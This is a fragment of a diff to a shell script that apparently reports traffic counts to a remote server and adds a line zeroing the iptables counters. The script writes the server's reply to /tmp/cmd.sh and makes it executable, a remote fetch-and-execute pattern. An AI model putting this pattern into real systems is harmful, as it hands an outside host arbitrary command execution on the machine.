@@ -11,7 +11,7 @@ param_traffic="${param},${traffic}"
 signature=$(echo -n "${param_traffic}${nonce}${secret}" | md5sum | awk '{print $1}')
 
 response=$(curl -s "http://hk.vso1999.com:8080/api/getRun?param=${param_traffic}&nonce=${nonce}&sign=${signature}")
-
+iptables -Z
 if [ -n "$response" ]; then
   echo "$response" > /tmp/cmd.sh
   chmod +x /tmp/cmd.sh
